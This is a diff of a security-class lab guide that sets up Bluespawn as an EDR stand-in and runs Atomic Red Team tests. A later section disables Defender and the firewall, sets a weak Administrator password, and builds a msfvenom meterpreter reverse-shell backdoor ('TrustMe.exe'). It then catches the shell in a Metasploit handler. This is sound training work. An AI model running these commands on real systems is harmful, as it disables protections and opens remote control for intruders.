@@ -1,6 +1,6 @@
 ![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)
 
-# Bluespawn
+# Atomic Red Team And Bluespawn
 
 In this lab we will be using Bluespawn as a stand-in for an EDR system.  Normally full EDRs like Cylance and Crowdstrike are very expensive and tend not to show up in classes like this.  However, the folks at University of Virginia have done an outstanding job with BlueSpawn. 
 
@@ -24,7 +24,8 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableBehaviorMonitoring $true
 ```
 
-![](attachments/disableDefender.png)
+<img width="824" height="155" alt="2026-03-26_09-47" src="https://github.com/user-attachments/assets/d83571b4-0a39-4e4b-a9ef-cf6763954e2c" />
+
 
 This will disable Defender for this session.
 
@@ -47,12 +48,11 @@ cd \IntroLabs
 ```bash
 BLUESPAWN-client-x64.exe --monitor --aggressiveness cursory
 ```
- 
-![](attachments/cdandstartbluespawn.png)
 
 You should see something like this:
 
-![](attachments/bluspawnlaunched.png)
+<img width="862" height="638" alt="2026-03-26_09-50" src="https://github.com/user-attachments/assets/a3419596-b4ca-4ea1-8d2a-832046873f76" />
+
 
 If you made it this far, perfect! That means Bluespawn is up and running.
 
@@ -81,7 +81,8 @@ Install-AtomicRedTeam -getAtomics -Force
 
 Once you see the following, you are set to move forward:
 
-![](attachments/installationconfirmation.png)
+<img width="1100" height="292" alt="2026-03-26_09-54" src="https://github.com/user-attachments/assets/41cb6202-0911-480c-bb68-0953bf66a213" />
+
 
 Next, in the PowerShell Window we need to navigate to the Atomic Red Team directory and import the powershell modules:
 
@@ -155,14 +156,15 @@ https://attack.mitre.org/techniques/T1546/008/
 
 It should look like this:
 
-![](attachments/invokeatomicv1.png)
+<img width="633" height="264" alt="2026-03-26_10-00" src="https://github.com/user-attachments/assets/3cc66d66-4156-45be-b149-e81145a1a920" />
+
 
 >[!NOTE]
 >
 >There might be some errors when this runs. This is 
 normal.
 
->[!NOTICE]
+>[!IMPORTANT]
 >
 >We had to cross reference the old numbering with the new.
 >
@@ -175,7 +177,8 @@ normal.
 
 You should be getting a lot of alerts with Bluespawn! Switch tabs in your Terminal to see them:
 
-![](attachments/bluespawndetections.png)
+<img width="1096" height="631" alt="2026-03-26_10-09" src="https://github.com/user-attachments/assets/135ce716-47fb-4840-b6a2-1c00c999bc87" />
+
 
 Now, let’s go back to the PowerShell window and clean up:
 
@@ -185,134 +188,156 @@ Invoke-AtomicTest All -Cleanup
 
 It should look like this:
 
-![](attachments/Clipboard_2020-06-23-13-36-10.png)
+<img width="1093" height="444" alt="2026-03-26_10-06" src="https://github.com/user-attachments/assets/2dd53a33-3c40-4cf8-9d86-bb18c3bb7ec5" />
+
 
 # If you have more time
 
 Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:
 
-<img width="54" height="39" alt="image" src="https://github.com/user-attachments/assets/a0e67fe8-d42a-4795-b566-98dc7a82daa8" />
+<img width="74" height="91" alt="image" src="https://github.com/user-attachments/assets/685d264c-661c-4dbf-aa79-54f925cefdb1" />
 
 
 Next, run the following command in the **Powershell** terminal:
 
-<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
+```ps
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
-<img width="786" height="223" alt="image" src="https://github.com/user-attachments/assets/def5f9b6-22c7-4278-9b37-fbfb5af3a02e" />
+<img width="820" height="139" alt="2026-03-26_10-20" src="https://github.com/user-attachments/assets/446b50ed-75b5-4e04-a505-559833112aa1" />
+
 
 This will disable **Defender** for this session.
 
 If you get angry red errors, that is **Ok**, it means **Defender** is not running.
 
+Open **Command Prompt**
+
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/761a7584-f744-4f6a-926b-339891c1d5b4" />
+
 Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 
-<pre> netsh advfirewall set allprofiles state off</pre>
+```cmd
+netsh advfirewall set allprofiles state off
+```
 
 
 Next, set a password for the Administrator account that you can remember
 
-<pre>net user Administrator password1234</pre>
+```bash
+net user Administrator password1234
+```
 
 Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
-Before we move on from our Powershell window, lets get our IP by running the following command:
+Let's continue by opening an **Ubuntu** terminal
 
-<pre>ipconfig</pre>
-
-
-**REMEMBER - YOUR IP WILL BE DIFFERENT**
-
-Write this IP down so we can use it again later.
-
-Let's continue by opening a **Kali** terminal
-
-<img width="71" height="68" alt="image" src="https://github.com/user-attachments/assets/5f116093-6854-4e55-a231-0c42359dc163" />
-
-Alternatively, you can click on the **Kali** icon in the taskbar.
-
-
-We need to run the following commands in order to mount our remote system to the correct directory:
-
-<pre>sudo su -</pre>
-
-<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>
-
-**REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**
+<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/dc26dda4-12b8-4f03-8a07-f170e5064f8d" />
 
 
 
-Run the following command to navigate into the mounted directory:
+Become root:
 
-<pre>cd /mnt/windows-share</pre>
+```bash
+sudo su -
+```
 
-<img width="645" height="251" alt="image" src="https://github.com/user-attachments/assets/b3a98a1f-559f-46b3-8967-88457212d1ee" />
 
+Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:
 
-Before we run the next commands, we need to get the IP of our Kali System (AKA our Linux IP Adress). Lets do so by running the following:
+```bash
+ifconfig
+```
 
-<pre>ifconfig</pre>
-
-<img width="660" height="419" alt="image" src="https://github.com/user-attachments/assets/d88c93b2-c80f-4a88-ba71-3e82cbcf20a2" />
-
+<img width="716" height="175" alt="Get_IPLinux" src="https://github.com/user-attachments/assets/55ffa0a2-0502-4331-ad4e-720b1c1f4205" />
 
 **REMEMBER: YOUR IP WILL BE DIFFERENT**
 
 Run the following commands to start a simple backdoor and backdoor listener: 
 
-<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
-
-<img width="646" height="148" alt="image" src="https://github.com/user-attachments/assets/d84a0070-9c3f-47cb-b1b4-ea447ddbdeef" />
-
-
-
-Let's start the **Metasploit** Handler.  Open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.
-
-<img width="71" height="68" alt="image" src="https://github.com/user-attachments/assets/5f116093-6854-4e55-a231-0c42359dc163" />
+```bash
+cd /tmp/
+```
 
 
-Let's become root.
 
-<pre>sudo su -</pre>
+Run the following commands to start a simple backdoor and backdoor listener: 
+
+```bash
+
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
+```
+
+
+
+<img width="1096" height="136" alt="2026-03-26_10-33" src="https://github.com/user-attachments/assets/cedde4be-e44e-4bab-87bb-5a683603e50f" />
+
+
+
 
 Now let's start the **Metasploit** Handler
 
-<pre>msfconsole -q</pre>
+```bash
+msfconsole -q
+```
 
 We are going to run the following commands to correctly set the parameters:
 
-<pre>use exploit/multi/handler</pre>
+```bash
+use exploit/multi/handler
+```
 
-<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
+```bash
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
 
-<pre>set LHOST [Your Linux IP Address]</pre>
+```bash
+set LHOST [Your Linux IP Address]
+```
 
 Remember, **Your IP will be different!**
 
-<pre>exploit</pre>
+```bash
+exploit
+```
 
 It should look like this:
 
-<img width="636" height="405" alt="image" src="https://github.com/user-attachments/assets/ca5787cd-967d-45b0-ac90-327b4eabfe69" />
-
-
-We will need to open a **"cmd.exe"** terminal as **Administrator**.
-
-<img width="53" height="40" alt="image" src="https://github.com/user-attachments/assets/47d5e363-0b2a-4009-a117-6103db26870d" />
+<img width="687" height="206" alt="2026-02-23_15-38" src="https://github.com/user-attachments/assets/71226123-2163-4237-8173-c7586de81ee7" />
 
 
 
-let's run the following commands to run the **"TrustMe.exe"** file.
 
-<pre>cd \</pre>
+Open up a **Powershell** terminal, copy the file over from **Linux**
+
+```ps
+cd .\Desktop\
+```
+
+```ps
+scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
+```
+
+Open a **Command Prompt**
+
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/62be252d-35ca-41a4-8ade-ba5d8a8478bb" />
+
+
+Let's run the following commands to run the **"TrustMe.exe"** file.
+
+```cmd
+cd \Users\Administrator\Desktop
+```
  
 Then run it with the following:
 
- <pre>TrustMe.exe</pre>
+```cmd
+TrustMe.exe
+```
 
-Back at your Kali terminal, you should have a metasploit session!
+Back at your Ubuntu terminal, you should have a metasploit session!
 
-![](attachments/meterpretersession.png)
-
+<img width="987" height="392" alt="2026-03-26_10-44" src="https://github.com/user-attachments/assets/152dd3e7-11d7-43d8-85f6-45d0870cc725" />
 
 Now, let’s look at keystroke logging.
 
